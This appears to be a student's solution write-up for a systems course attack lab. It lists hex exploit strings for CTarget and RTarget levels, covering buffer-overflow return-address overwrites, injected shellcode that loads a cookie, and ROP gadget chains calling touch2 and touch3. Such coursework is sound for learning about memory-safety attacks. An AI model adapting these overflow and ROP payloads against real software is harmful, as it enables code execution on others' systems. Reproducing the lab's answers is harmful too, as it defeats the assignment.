@@ -1,0 +1,95 @@
+Running Program:
+
+objdump -d "executable" > "disassembledname.txt"
+./hex2raw < "targetname.txt" | ./"targetexecutable"
+
+CTarget 1:
+
+Perform a buffer overlow attack - Write more memory to a block of memory than it is allocated to hold.
+
+The buffer in this case is 0x28 - 40 bytes that can be found in getbuf.
+
+00 00 00 00 00 00 00 00  ; 8 bytes
+00 00 00 00 00 00 00 00  ; 8 bytes
+00 00 00 00 00 00 00 00  ; 8 bytes
+00 00 00 00 00 00 00 00  ; 8 bytes
+00 00 00 00 00 00 00 00  ; 8 bytes (total 40 bytes of padding)
+5d 25 40 00 00 00 00 00  ; Address of touch1 (0x40255d)
+
+Fill up the buffer, overwrite the return address, and then direct execution to touch1.
+
+CTarget 2:
+
+Inject code so that touch2 will be executed.
+
+Cookie: 0x55ca9f6d
+
+48 c7 c7 6d 9f ca 55 c3  ; Move cookie into %edi
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer (total 32 bytes of padding)
+80 47 66 55 00 00 00 00  ; Return address - address of %rsp (0x55664780)
+8d 25 40 00 00 00 00 00  ; Address of touch2 (0x40258d)
+
+We first move the cookie into the %edi register, fill the buffer, and then overwrite the return address with the address of the %rsp, and then direct execution to touch2.
+
+CTarget 3:
+
+Inject code so that touch3 will be executed with a string representation of the cookie.
+
+Cookie: 0x55ca9f6d - 35 35 63 61 39 66 36 64 (String representation)
+
+48 c7 c7 b8 47 66 55 c3  ; Store cookie after the touch3 function (address of %rsp (0x55664780) + 0x28 (size of buffer) + 0x8 (size of return address) + 0x8 (size of touch3 address) = 0x38)
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer (total 32 bytes of padding)
+80 47 66 55 00 00 00 00  ; Return address - address of %rsp (0x55664780)
+a2 26 40 00 00 00 00 00  ; Address of touch3 (0x4026a2)
+35 35 63 61 39 66 36 64  ; Cookie in ASCII - Fed into touch3 function
+
+We first inject code into the program after the address of touch3 so it can't be overwritten in execution. Pad the buffer, overwrite the return address with %rsp, call the touch3 function, and feed the cookie as an ASCII into the function.
+
+RTarget 2:
+
+Call gadgets from the program so that registers can be moved around to perform execution.
+
+Cookie: 0x55ca9f6d
+
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer (total 40 bytes of padding)
+5a 27 40 00 00 00 00 00  ; pop, call addval_426
+6d 9f ca 55 00 00 00 00  ; Cookie 
+64 27 40 00 00 00 00 00  ; mov, call getval_167 
+8d 25 40 00 00 00 00 00  ; Address of touch2 (0x40258d)
+
+We first overwrite the buffer, then call a pop instruction, move the cookie into %edi, call a mov instruction, and then call the touch2 function.
+
+RTarget 3:
+
+The goal is to call gadgets such that we move %rax into %esi
+
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer
+00 00 00 00 00 00 00 00  ; Padding of buffer (total 40 bytes of padding)
+33 28 40 00 00 00 00 00  ; Move %rsp into %rax
+64 27 40 00 00 00 00 00  ; Move %rax into %rdi
+5a 27 40 00 00 00 00 00  ; Pop %rax
+48 00 00 00 00 00 00 00  ; Distance between first intruction and cookie string (9 * 8 = 72 = 0x48)
+13 28 40 00 00 00 00 00  ; Move %eax into %edx
+5c 28 40 00 00 00 00 00  ; Move %edx into %ecx
+de 28 40 00 00 00 00 00  ; Move %ecx into %esi
+ab 27 40 00 00 00 00 00  ; Load the address of %rdi into %rax
+64 27 40 00 00 00 00 00  ; Move %rax into %rdi
+a2 26 40 00 00 00 00 00  ; Address of touch3 (0x4026a2)
+35 35 63 61 39 66 36 64  ; Cookie in ASCII - Fed into touch 3 function
+
+The instructions to achieve this involve the following:
+
+rsp -> rax -> rdi (pop rax), offset of first instruction and cookie, eax -> edx -> ecx -> esi -> lea rdi -> rax -> rdi, call touch3 with cookie string.
